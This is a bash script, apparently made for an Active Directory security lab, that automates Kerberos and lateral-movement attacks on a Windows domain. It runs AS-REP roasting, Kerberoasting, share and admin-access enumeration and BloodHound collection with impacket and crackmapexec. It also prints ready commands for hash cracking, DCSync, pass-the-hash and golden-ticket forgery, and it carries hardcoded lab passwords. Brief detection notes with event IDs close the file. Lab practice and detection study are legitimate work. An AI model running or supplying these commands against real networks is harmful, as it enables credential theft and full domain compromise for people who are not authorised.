#!/bin/bash
#
# Lateral Movement & Privilege Escalation Script for AD Security Lab
# Author: AD Security Lab
# Description: Kerberos attacks and lateral movement techniques
#
# Usage: ./lateral-movement.sh [target_ip] [domain] [username] [password]
#

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Default values
DC_IP="${1:-192.168.1.100}"
DOMAIN="${2:-yourcompany.local}"
USERNAME="${3:-jsmith}"
PASSWORD="${4:-Password123!}"
OUTPUT_DIR="$HOME/ad-lab-attacks"

# Banner
echo -e "${RED}"
echo "=========================================="
echo "  AD Security Lab - Lateral Movement"
echo "=========================================="
echo -e "${NC}"
echo -e "${YELLOW}WARNING: Only use in authorized lab environments!${NC}"
echo ""

# Create output directory
mkdir -p "$OUTPUT_DIR"

echo -e "${CYAN}Target DC: $DC_IP${NC}"
echo -e "${CYAN}Domain: $DOMAIN${NC}"
echo -e "${CYAN}Username: $USERNAME${NC}"
echo ""

# ============================================
# Attack 1: AS-REP Roasting
# ============================================
echo -e "${YELLOW}[*] Attack 1: AS-REP Roasting${NC}"
echo "--------------------------------------"
echo -e "${BLUE}[*] Finding users without Kerberos pre-authentication...${NC}"
echo ""

# Create user file if it doesn't exist
USER_FILE="$OUTPUT_DIR/users.txt"
if [ ! -f "$USER_FILE" ]; then
    cat > "$USER_FILE" << 'EOF'
jsmith
jdoe
bwilson
admin.user
svc_sql
EOF
fi

# Run AS-REP Roasting
impacket-GetNPUsers "$DOMAIN/" -usersfile "$USER_FILE" -dc-ip "$DC_IP" -format hashcat -outputfile "$OUTPUT_DIR/asrep_hashes.txt" 2>/dev/null

if [ -f "$OUTPUT_DIR/asrep_hashes.txt" ] && [ -s "$OUTPUT_DIR/asrep_hashes.txt" ]; then
    echo -e "${GREEN}[+] AS-REP hashes found:${NC}"
    cat "$OUTPUT_DIR/asrep_hashes.txt"
    echo ""
    echo -e "${YELLOW}[*] To crack: hashcat -m 18200 $OUTPUT_DIR/asrep_hashes.txt /usr/share/wordlists/rockyou.txt${NC}"
else
    echo -e "${YELLOW}[*] No AS-REP roastable users found or file not created${NC}"
fi
echo ""

# ============================================
# Attack 2: Kerberoasting
# ============================================
echo -e "${YELLOW}[*] Attack 2: Kerberoasting${NC}"
echo "--------------------------------------"
echo -e "${BLUE}[*] Requesting TGS for accounts with SPNs...${NC}"
echo ""

# Run Kerberoasting with valid credentials
impacket-GetUserSPNs "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip "$DC_IP" -outputfile "$OUTPUT_DIR/kerberoast_hashes.txt" 2>/dev/null

if [ -f "$OUTPUT_DIR/kerberoast_hashes.txt" ] && [ -s "$OUTPUT_DIR/kerberoast_hashes.txt" ]; then
    echo -e "${GREEN}[+] Kerberoast hashes obtained:${NC}"
    cat "$OUTPUT_DIR/kerberoast_hashes.txt" | head -5
    echo ""
    echo -e "${YELLOW}[*] To crack: hashcat -m 13100 $OUTPUT_DIR/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt${NC}"
else
    echo -e "${YELLOW}[*] No Kerberoastable accounts found or authentication failed${NC}"
fi
echo ""

# ============================================
# Attack 3: Enumerate Domain with Valid Creds
# ============================================
echo -e "${YELLOW}[*] Attack 3: Domain Enumeration${NC}"
echo "--------------------------------------"

echo -e "${BLUE}[*] Enumerating domain with valid credentials...${NC}"
echo ""

# Get domain SID
echo -e "${BLUE}  [*] Getting Domain SID...${NC}"
impacket-lookupsid "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" 2>/dev/null | head -10 | tee "$OUTPUT_DIR/domain_sid.txt"
echo ""

# Enumerate shares
echo -e "${BLUE}  [*] Enumerating accessible shares...${NC}"
crackmapexec smb "$DC_IP" -u "$USERNAME" -p "$PASSWORD" --shares 2>/dev/null | tee "$OUTPUT_DIR/shares.txt"
echo ""

# Check for local admin rights
echo -e "${BLUE}  [*] Checking local admin access...${NC}"
crackmapexec smb 192.168.1.100 192.168.1.101 192.168.1.102 -u "$USERNAME" -p "$PASSWORD" 2>/dev/null | tee "$OUTPUT_DIR/admin_access.txt"
echo ""

# ============================================
# Attack 4: BloodHound Collection
# ============================================
echo -e "${YELLOW}[*] Attack 4: BloodHound Data Collection${NC}"
echo "--------------------------------------"

echo -e "${BLUE}[*] Collecting BloodHound data...${NC}"
echo -e "${BLUE}[*] This may take a minute...${NC}"
echo ""

cd "$OUTPUT_DIR"
bloodhound-python -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -ns "$DC_IP" -c All 2>/dev/null

if ls "$OUTPUT_DIR"/*.json 1>/dev/null 2>&1; then
    echo -e "${GREEN}[+] BloodHound JSON files created:${NC}"
    ls -la "$OUTPUT_DIR"/*.json 2>/dev/null
    echo ""
    echo -e "${YELLOW}[*] Import these files into BloodHound GUI${NC}"
    echo -e "${YELLOW}[*] Start neo4j: sudo neo4j console${NC}"
    echo -e "${YELLOW}[*] Run: bloodhound${NC}"
else
    echo -e "${YELLOW}[*] BloodHound collection may have failed. Try manually.${NC}"
fi
echo ""

# ============================================
# Attack 5: DCSync (if Domain Admin)
# ============================================
echo -e "${YELLOW}[*] Attack 5: DCSync (requires Domain Admin)${NC}"
echo "--------------------------------------"

echo -e "${BLUE}[*] Attempting DCSync (will fail without Domain Admin rights)...${NC}"
echo -e "${YELLOW}[*] Use admin.user:AdminP@ss1! for this attack${NC}"
echo ""

echo -e "${CYAN}Manual command:${NC}"
echo "  impacket-secretsdump $DOMAIN/admin.user:AdminP@ss1!@$DC_IP"
echo ""

# ============================================
# Attack 6: Pass-the-Hash Examples
# ============================================
echo -e "${YELLOW}[*] Attack 6: Pass-the-Hash (Reference)${NC}"
echo "--------------------------------------"

echo -e "${BLUE}[*] Pass-the-Hash commands (after obtaining hashes):${NC}"
echo ""
echo -e "${CYAN}# PsExec with hash${NC}"
echo "  impacket-psexec -hashes LM:NTLM administrator@192.168.1.101"
echo ""
echo -e "${CYAN}# WMIExec with hash${NC}"
echo "  impacket-wmiexec -hashes LM:NTLM administrator@192.168.1.101"
echo ""
echo -e "${CYAN}# Evil-WinRM with hash${NC}"
echo "  evil-winrm -i 192.168.1.101 -u administrator -H NTLM_HASH"
echo ""
echo -e "${CYAN}# CrackMapExec spray hash${NC}"
echo "  crackmapexec smb 192.168.1.100-102 -u administrator -H NTLM_HASH"
echo ""

# ============================================
# Attack 7: Golden Ticket (Reference)
# ============================================
echo -e "${YELLOW}[*] Attack 7: Golden Ticket (Reference)${NC}"
echo "--------------------------------------"

echo -e "${BLUE}[*] Golden Ticket commands (after obtaining krbtgt hash):${NC}"
echo ""
echo -e "${CYAN}# Create Golden Ticket${NC}"
echo "  impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain $DOMAIN administrator"
echo ""
echo -e "${CYAN}# Use Golden Ticket${NC}"
echo "  export KRB5CCNAME=administrator.ccache"
echo "  impacket-psexec $DOMAIN/administrator@dc01.$DOMAIN -k -no-pass"
echo ""

# ============================================
# Summary
# ============================================
echo -e "${BLUE}"
echo "=========================================="
echo "  Attack Phase Complete"
echo "=========================================="
echo -e "${NC}"

echo -e "${YELLOW}Output files:${NC}"
ls -la "$OUTPUT_DIR/" 2>/dev/null
echo ""

echo -e "${YELLOW}Detection Notes:${NC}"
echo "  - AS-REP Roasting: Event ID 4768 with RC4 encryption (0x17)"
echo "  - Kerberoasting: Event ID 4769 with RC4 encryption (0x17)"
echo "  - DCSync: Event ID 4662 with Replication rights"
echo "  - Pass-the-Hash: Event ID 4624 with NTLM, unusual source IP"
echo "  - Golden Ticket: Event ID 4768 with abnormal ticket lifetime"
echo ""

echo -e "${YELLOW}Cleanup:${NC}"
echo "  rm -rf $OUTPUT_DIR/*.txt $OUTPUT_DIR/*.json $OUTPUT_DIR/*.ccache"
echo ""
